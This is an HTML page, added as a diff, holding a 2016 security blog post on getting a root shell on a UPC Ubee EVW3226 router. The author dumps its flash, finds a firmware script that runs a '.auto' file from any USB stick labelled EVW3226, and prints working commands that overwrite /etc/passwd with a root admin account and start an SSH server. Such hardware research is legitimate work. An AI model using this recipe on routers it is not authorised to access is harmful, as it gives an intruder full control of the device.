@@ -1,0 +1,257 @@
+<!doctype html>
+<html lang="en" prefix="og: http://ogp.me/ns#">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>UPC Ubee EVW3226 Fail</title>
+    <meta name="description" content="UPC Ubee EVW3226 Fail">
+    
+    <meta name="keywords" content="Ubee EVW3226, UPC, root shell, hacking">
+    
+    <meta name="author" content="Christian Mehlmauer">
+
+    <meta name="twitter:card" content="summary">
+    
+    <meta name="twitter:site" content="@_FireFart_" />
+    <meta name="twitter:creator" content="@_FireFart_" />
+    
+    <meta name="twitter:title" content="UPC Ubee EVW3226 Fail">
+    <meta name="twitter:description" content="UPC Ubee EVW3226 Fail">
+    <meta property="og:title" content="UPC Ubee EVW3226 Fail">
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="https://firefart.at/post/upc_ubee_fail/" />
+    <meta property="og:description" content="UPC Ubee EVW3226 Fail">
+    
+    <meta property="og:image" content="https://www.gravatar.com/avatar/530ee2111e51f3d8379b1081d13bf345.png?s=400" />
+    <meta name="twitter:image" content="https://www.gravatar.com/avatar/530ee2111e51f3d8379b1081d13bf345.png?s=400" />
+    
+    <meta property="og:updated_time" content="2016-01-17 12:45:00 &#43;0100 CET"/>
+    <meta property="article:author" content="https://twitter.com/_FireFart_"/>
+
+    <link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,700%7COxygen:400,700" rel="stylesheet" type="text/css">
+    <link rel="stylesheet" href="https://yui-s.yahooapis.com/pure/0.6.0/pure-min.css">
+    <link rel="stylesheet" href="https://yui-s.yahooapis.com/pure/0.6.0/grids-responsive-min.css">
+
+    <link rel="stylesheet" href='https://firefart.at/css/all.min.css'>
+    <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet">
+
+    
+    
+    <script type="application/ld+json">
+    [
+      {
+        "@context" : "http://schema.org",
+        "@type" : "WebSite",
+        "name" : "FireFart",
+        "url" : "https://firefart.at"
+      },
+      {
+        "@context" : "http://schema.org",
+        "@type" : "Person",
+        "name" : "Christian Mehlmauer",
+        "url" : "https://firefart.at",
+        "sameAs" : [
+          "https://twitter.com/_FireFart_",
+          "https://github.com/FireFart",
+          "https://www.facebook.com/christian.mehlmauer"
+        ]
+      }
+    ]
+    </script>
+
+</head>
+<body>
+
+
+<div id="layout" class="pure-g">
+    <div class="sidebar pure-u-1 pure-u-md-1-4">
+    <div class="header">
+        <h1 class="brand-title"><a href="/">FireFart</a></h1>
+        <h2 class="brand-tagline"> that austrian security guy </h2>
+
+        <nav class="nav">
+            <ul class="nav-list">
+                
+                <li class="nav-item">
+                    <a class="pure-button" target="_blank" href="https://twitter.com/_FireFart_">
+                        <i class="fa fa-twitter"></i> Twitter
+                    </a>
+                </li>
+                
+                
+                <li class="nav-item">
+                     <a class="pure-button" target="_blank" href="https://github.com/FireFart">
+                        <i class="fa fa-github-alt"></i> Github
+                    </a>
+                </li>
+                
+                
+                
+                <li class="nav-item">
+                    <a class="pure-button" href="/page/about/"><i class="fa fa-info"></i> about me</a>
+                </li>
+                <li class="nav-item">
+                    <a class="pure-button" target="_blank" href='https://firefart.at/index.xml'>
+                        <i class="fa fa-rss"></i> rss
+                    </a>
+                </li>
+            </ul>
+        </nav>
+    </div>
+</div>
+
+
+    <div class="content pure-u-1 pure-u-md-3-4">
+        <div>
+            
+            <div class="posts">
+                <h1 class="content-subhead">17 Jan 2016, 12:45</h1>
+                <section class="post">
+                    <header class="post-header">
+
+                        <a href="/post/upc_ubee_fail/" class="post-title">UPC Ubee EVW3226 Fail</a>
+
+                        <p class="post-meta">
+                            
+                            
+                        </p>
+                    </header>
+
+                    <div id="toc" class="well col-md-4 col-sm-6">
+                      
+                    </div>
+
+                    <div class="post-description">
+                      <p>Inspired by <a href="https://twitter.com/bl4sty">Blasty</a> and his <a href="https://haxx.in/upc-wifi/">UPC Wifi key generator</a> I decided to take a look at my UPC router too. It&rsquo;s a <strong>Ubee EVW3226</strong> with a custom firmware built by UPC providing a modified web interface and a lot of other stuff.</p>
+
+<p>First I tried to identify some debug pins on the board and found multiple possible UART connectors. I connected my <a href="https://www.sparkfun.com/products/9544">Buspirate</a> to the first UART and got a login shell protected by a password. I tried some default passwords but was not able to get in so I needed to find another way. According to <a href="https://freeture.ch/post/2015-03-06-upc-router-evw3226-part3-r00t/">another blog post</a> I found there is also a second UART connector with no password but this one was not working on my device.</p>
+
+<p><a href="/img/ubee/uart.png"><img src="/img/ubee/uart_thumb.png" alt="UART" /></a></p>
+
+<p>So I took a deeper look at the chips on the board and identified two flash chips: <em>Spansion FL128PIF</em>. By looking at the <a href="http://www.spansion.com/Support/Datasheets/S25FL128P_00.pdf">datasheet</a> I discovered there are some SPI pins on the chip to dump its content (or write to it). So I attached a SOIC test clip on top of the flash chip and connected my <a href="http://goodfet.sourceforge.net/">GoodFET</a> to it. Using the test clip is a good alternative because there is no need to desolder any chips. I was able to dump the whole 16MB memory of each chip using this method with <code>spiflash dump</code>. The address ranges to dump can be taken from the datasheet too.</p>
+
+<p><a href="/img/ubee/testpin.png"><img src="/img/ubee/testpin_thumb.png" alt="DUMP" /></a></p>
+
+<p>The next thing to do was to extract the content of the dumped images. By using the latest development version of <a href="https://github.com/devttys0/binwalk">binwalk</a> I was able to extract the file system contents of both chips. This dump only contains the firmware with no dynamic content from UPC so far so the running config is still missing.</p>
+
+<p>After peeking around some binaries with IDA I found the following code in <em>aimDaemon</em>:</p>
+
+<p><a href="/img/ubee/extract_label.png"><img src="/img/ubee/extract_label_thumb.png" alt="Extract Label" /></a></p>
+
+<p><a href="/img/ubee/check_label.png"><img src="/img/ubee/check_label_thumb.png" alt="Extract Label" /></a></p>
+
+<p><a href="/img/ubee/execute_shell.png"><img src="/img/ubee/execute_shell_thumb.png" alt="Extract Label" /></a></p>
+
+<p>The snippets show the relevant code sections: The binary extracts the label of an external attached USB device and if it matches <code>EVW3226</code> it executes <code>/var/tmp/mount-usb.sh</code> with <code>go</code> as a first parameter.</p>
+
+<p><code>mount_usb.sh</code>:</p>
+
+<pre><code class="language-bash">#!/bin/bash
+if [ $1 == &quot;go&quot; ]; then
+  dev_path=$(blkid /dev/sd |cut -c 1-9)
+  eval $(blkid /dev/sd |cut -d &quot; &quot; -f 2)
+  eval $(blkid /dev/sd |cut -d &quot; &quot; -f 3)
+  eval $(blkid /dev/sd |cut -d &quot; &quot; -f 4)
+  echo &quot;dev_path=\&quot;$dev_path\&quot; LABEL=\&quot;$LABEL\&quot; UUID=\&quot;$UUID\&quot; TYPE=\&quot;$TYPE\&quot;&quot; &gt;&gt; /tmp/mountlist
+
+  umount_folder=$(mount | grep &quot;/var/tmp&quot; | awk '{print $3}')
+  for curr_folder in $umount_folder ; do
+      if [ -n &quot;$curr_folder&quot;]; then
+  		umount -l $curr_folder
+          rm -fr $curr_folder
+  	  fi
+  done
+
+  for curr_folder in $UUID ; do
+    mkdir /var/tmp/media/$curr_folder -p
+    if [ &quot;$TYPE&quot; == &quot;ntfs&quot; ]; then
+      	echo &quot;ntfs-3g &quot;$dev_path&quot; /var/tmp/media/&quot;$curr_folder
+      	ntfs-3g $dev_path /var/tmp/media/$curr_folder
+    else
+      	echo &quot;mount &quot;$dev_path&quot; /var/tmp/media/&quot;$curr_folder
+      	mount $dev_path /var/tmp/media/$curr_folder
+    fi
+    if test -f /var/tmp/media/$curr_folder/.auto
+	then
+	    rm -fr /var/tmp/disk
+	    cd /var/tmp
+	    ln -s /var/tmp/media/$curr_folder disk
+	   	chmod +x /var/tmp/media/$curr_folder/.auto
+	   	sh /var/tmp/media/$curr_folder/.auto
+	fi
+    done
+    if [ $2 == &quot;1&quot; ]; then
+    	killall minidlna
+    	/fss/fss2/sbin/minidlna -R -f /var/tmp/minidlna.conf
+    fi
+else
+echo $1 ... &gt;&gt; /var/tmp/.usbadd
+fi
+</code></pre>
+
+<p>As you may see this script mounts the usb stick and checks if the stick has a <code>.auto</code> file present. If the file exists a symbolic link to <code>/var/tmp/disk</code> is created and the <code>.auto</code> file is executed with <code>sh</code>.</p>
+
+<p>So by creating an USB stick with the correct label and this autorun file we are able to execute any commands we like on the router.</p>
+
+<p>The device is capable of running in router or in bridge mode. It looks like there is some check in place to only execute the script when running in <code>router</code> mode so be sure to switch to this mode if you want to try it on your own.</p>
+
+<p>So lets first prepare our USB stick:</p>
+
+<pre><code class="language-bash">umount /dev/sdb1
+fdisk /dev/sdb # clear partition table and create a new primary partition
+mkfs.vfat /dev/sdb1
+mlabel -i /dev/sdb1 ::EVW3226
+</code></pre>
+
+<p>Let&rsquo;s try to start a telnet server on the device by putting the following in the <code>.auto</code> file:</p>
+
+<pre><code class="language-bash">telnetd &amp;
+</code></pre>
+
+<p>After plugging the stick in and waiting a few seconds I was able to connect via telnet. Unfortunately it seems some process is killing <code>telnetd</code> on a regular basis so it&rsquo;s no stable way to get access to the device.</p>
+
+<p>Luckily there is also dropbear present so we can start a ssh server. The filesystem is missing the required hostkeys so I recreated them on a Ubuntu VM on the USB stick by</p>
+
+<pre><code class="language-bash">dropbearkey -t rsa -f /media/firefart/EVW3226/dropbear_rsa_host_key
+</code></pre>
+
+<p>As I was not able to crack the password hashes in a reasonable time we also need to add our own user. I did this by just overwriting <code>/etc/passwd</code> with an <code>admin:admin</code> hash.</p>
+
+<p>So the final <code>.auto</code> file looks like</p>
+
+<pre><code class="language-bash">#!/bin/bash
+echo admin:FvTuBQSax2MqI:0:0:admin,,,:/:/bin/sh &gt; /etc/passwd
+dropbear -r /var/tmp/disk/dropbear_rsa_host_key -p 192.168.0.1:22
+</code></pre>
+
+<p>After plugging in the USB-Stick and waiting a few seconds we can connect to the device using ssh and login using the password <code>admin</code>.</p>
+
+<pre><code class="language-bash">ssh admin@192.168.0.1
+</code></pre>
+
+<p>The next steps are to peek around the device. There are already a lot of passwords and private keys lying around in the firmware image.</p>
+
+<p>There was also a great talk on 32C3 - <a href="https://media.ccc.de/v/32c3-7133-beyond_your_cable_modem">Beyond Your Cable Modem</a> which gives some good ideas what to check next.</p>
+                    </div>
+                </section>
+            </div>
+            <div class="footer">
+    <div class="pure-menu pure-menu-horizontal pure-menu-open">
+        <ul>
+            <li>Copyright by Christian Mehlmauer</li>
+            <li>source code available on <a href="https://github.com/FireFart/blog">Github</a></li>
+        </ul>
+    </div>
+</div>
+<script type="text/javascript" src='https://firefart.at/js/all.min.js'></script>
+<script type="text/javascript" src='https://firefart.at/js/firefart.js'></script>
+
+<script type="text/javascript" src='https://firefart.at/js/anal.js'></script>
+<noscript><p><img src="//firefart.at/pi.php?idsite=1" style="border:0;" alt="placeholder" /></p></noscript>
+
+
+        </div>
+    </div>
+</div>
+</body>
+</html>
